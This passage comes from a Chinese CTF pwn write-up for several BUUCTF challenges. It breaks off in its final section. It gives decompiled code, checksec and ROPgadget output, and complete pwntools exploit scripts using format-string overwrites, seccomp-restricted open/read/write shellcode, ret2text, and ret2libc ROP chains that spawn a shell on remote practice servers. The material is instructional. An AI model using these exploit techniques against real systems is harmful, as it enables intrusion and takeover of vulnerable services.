   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x80492b2
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
08:0020│     0xffffd08c ◂— 0x1
09:0024│     0xffffd090 ◂— 0x0
0a:0028│     0xffffd094 ◂— 0x1
0b:002c│ ecx 0xffffd098 ◂— 'AAAA\n'
0c:0030│     0xffffd09c ◂— 0xa /* '\n' */
0d:0034│     0xffffd0a0 ◂— 0x0
... ↓        5 skipped
13:004c│     0xffffd0b8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x31f1c
```

知道格式化字符串漏洞的偏移量后，这题有两个解题思路：

- 修改`dword_804C044`字段中的内容，这样能在`if`条件`atoi(nptr) == dword_804C044`为真时，成功执行`system("/bin/sh")`。
- 利用`fmtstr_payload`将`atoi`函数地址修改为`system`函数地址，当输入的`nptr`为`/bin/sh`时，就能在`if`条件中的`atoi(nptr)`处成功执行`system("/bin/sh")`。

第一种解法：利用格式化字符串`%n`的特性修改`dword_804C044`字段中的内容，`bss_addr = 0x804C044`共`4`个字节，我们先把这个地址写到栈偏移量为`10`的地址，然后利用`%10$n`把`0x804C044`的字节长度`4`写入到`%10$n`处指针所指的地址`0x804C044`中去，这样做的话，字段`dword_804C044`中的内容就修改成功了，最后输入的`nptr`为`4`时就能使`if`条件`atoi(nptr) == dword_804C044`为真，从而执行`system("/bin/sh")`获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
bss_addr = 0x804C044
payload = p32(bss_addr) + b'%10$n'
io.sendline(payload)
io.sendline(b'4')
io.interactive()
```

第二种解法：在`Functions window`中看到有`system`函数，我们可以利用格式化字符串漏洞将`atoi`函数篡改为`system`函数，当用户在`"your passwd:"`后输入`/bin/sh`时，程序原来的`atoi(nptr)`就变成了`system("/bin/sh")`，从而获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
e = ELF('./pwn')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

------

### [pwnable_orw](https://buuoj.cn/challenges#pwnable_orw)

先`file ./orw  `查看文件类型，再`checksec --file=./orw  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./orw
./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./orw
[*] '/home/tyd/ctf/pwn/buuctf/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

用`IDA Pro 32bit`打开`orw`后按`F5`反汇编源码并查看主函数。可以看到英语病句`"Give my your shellcode:"`，应该是`"me"`才对。问题不大，`read()`函数读取了`0xC8`字节的`shellcode`，并进行执行。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

直接调用`asm(shellcraft.sh())`尝试写入`shellcode`失败。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29109)
shellcraft = asm(shellcraft.sh())
io.recvline(b'Give my your shellcode:')
io.sendline(shellcraft)
io.interactive()
```

审计`orw_seccomp()`函数，源码如下：

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。

```bash
sudo gem install seccomp-tools
```

通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。

```assembly
.bss:0804A060                 public shellcode
.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
......
.bss:0804A127 _bss            ends
```

`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`node4.buuoj.cn`的监听端口`29109`，发送`shellcode`可得`flag{11d4fea3-05ec-4f32-b5ad-d51908da309f}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29109)
bss_addr = 0x804A060
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)
shellcode += shellcraft.exit(0)
io.sendline(asm(shellcode))
io.interactive()
```

------

### [wustctf2020_getshell](https://buuoj.cn/challenges#wustctf2020_getshell)

先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。

使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x20u);
}
```

此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`flag{9a079da9-bb36-45c9-859b-bd86f27f1430}`即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27247)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()
```

------

### [jarvisoj_level3](https://buuoj.cn/challenges#jarvisoj_level3)

先`file ./level3`查看文件类型，再`checksec --file=./level3`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level3
./level3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level3    
[*] '/home/tyd/ctf/pwn/buuctf/level3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level3`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}
```

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。

```assembly
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 ;
-00000088
-00000088 buf             db 136 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`，然而打不通。

```bash
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27938)
elf = ELF('./level3')
main_addr = elf.symbols['main']
log.success("0x%x", main_addr)
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = b'a'*(0x88+0x4) 
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendlineafter(b'Input:\n', payload)
write_addr = u32(io.recv(4))
log.info('write_address => 0x%x', write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main) + p32(bin_sh_addr)
io.recvuntil(b'Input:\n')
io.sendline(payload)
io.interactive()
```

用题目给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。

编写`Python`代码求解，得到`flag{c999b5a3-c998-4cc5-978a-465c1bb9c00d}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27938)
elf = ELF('./level3')
main_addr = elf.symbols['main']
log.success("0x%x", main_addr)
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = b'a'*(0x88+0x4) 
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendlineafter(b'Input:\n', payload)
write_addr = u32(io.recv(4))
log.info('write_address => 0x%x', write_addr)
libc = ELF('./libc/libc_32.so.6')
libcbase = write_addr - libc.symbols['write']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [jarvisoj_level3_x64](https://buuoj.cn/challenges#jarvisoj_level3_x64)

先`file ./level3_x64`查看文件类型，再`checksec --file=./level3_x64`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level3_x64
./level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level3_x64
[*] '/home/tyd/ctf/pwn/buuctf/level3_x64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`level2_x64`，，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function(argc, argv, envp);
  return write(1, "Hello, World!\n", 0xEuLL);
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x80`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x200`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  write(1, "Input:\n", 7uLL);
  return read(0, buf, 0x200uLL);
}
```

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。

```assembly
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 buf             db 128 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x4006b3`，`pop rsi; pop r15; ret`的地址是`0x4006b1`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./level3_x64 --only "pop|ret"  
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret

Unique gadgets found: 11
```

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，选用的`Libc`为`libc6_2.23-0ubuntu10_amd64`，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{1b9ca510-a63b-40f9-a036-28548b032739}`，提交即可。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29665)
elf = ELF('./level3_x64')
main_addr = elf.symbols['main']
write_plt = elf.plt['write'] 
write_got = elf.got['write']
pop_rdi = 0x4006b3  # pop rdi ; ret
pop_rsi = 0x4006b1  # pop rsi ; pop r15 ; ret
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
io.sendlineafter(b'Input:\n', payload)
write_addr = u64(io.recv(8))
log.info('write_address => 0x%x', write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [ciscn_2019_c_1](https://buuoj.cn/challenges#ciscn_2019_c_1)

先`file ./ciscn_2019_c_1`查看文件类型再`checksec --file=./ciscn_2019_c_1`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_c_1
./ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_c_1
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`ciscn_2019_c_1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

输入`1`可调用`encrypt()`函数，双击`encrypt()`函数查看详情，`char`型数组`s`的可用栈大小为`0x50`字节，且`gets()`函数并不能限制`s`从标准输入中读取的字节长度，显然存在栈溢出漏洞。

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

在`Functions window`中并没有看到`system()`函数，`ROPgadget`也查不到，我们需要利用`gets()`函数的栈溢出漏洞来泄露出`puts()`函数的地址。由于题目并没有给出`libc.so.6`的版本，所以我们需要借助`LibcSearcher`来计算出`libc`的基地址，进而求得`system()`函数和`/bin/sh`的地址，最后劫持控制流获得靶机的`shell`权限。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400c83`，`ret`的地址为`0x4006b9`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_c_1 --only "pop|ret"  
Gadgets information
============================================================
0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c80 : pop r14 ; pop r15 ; ret
0x0000000000400c82 : pop r15 ; ret
0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop rbp ; ret
0x0000000000400aec : pop rbx ; pop rbp ; ret
0x0000000000400c83 : pop rdi ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b9 : ret
0x00000000004008ca : ret 0x2017
0x0000000000400962 : ret 0x458b
0x00000000004009c5 : ret 0xbf02

Unique gadgets found: 15
```

编写`Python`代码求解，得到`flag{ba4ddc51-c524-4cfe-93fd-911f7a10f2ef}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26769)
elf = ELF('./ciscn_2019_c_1')
pop_rdi = 0x400c83 # pop rdi; ret
ret = 0x4006b9 # ret
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.sendlineafter(b'Input your choice!', b'1')
payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.recvuntil(b'Ciphertext\n')
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info('puts_address => 0x%x', puts_addr)
libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.interactive()
```

------

### [ciscn_2019_en_2](https://buuoj.cn/challenges#ciscn_2019_en_2)

先`file ./ciscn_2019_en_2`查看文件类型再`checksec --file=./ciscn_2019_en_2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_en_2
./ciscn_2019_en_2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_en_2
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_en_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`ciscn_2019_en_2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

输入`1`可调用`encrypt()`函数，双击`encrypt()`函数查看详情，`char`型数组`s`的可用栈大小为`0x50`字节，且`gets()`函数并不能限制`s`从标准输入中读取的字节长度，显然存在栈溢出漏洞。

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

在`Functions window`中并没有看到`system()`函数，`ROPgadget`也查不到，我们需要利用`gets()`函数的栈溢出漏洞来泄露出`puts()`函数的地址。由于题目并没有给出`libc.so.6`的版本，所以我们需要借助`LibcSearcher`来计算出`libc`的基地址，进而求得`system()`函数和`/bin/sh`的地址，最后劫持控制流获得靶机的`shell`权限。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400c83`，`ret`的地址为`0x4006b9`。

```bash
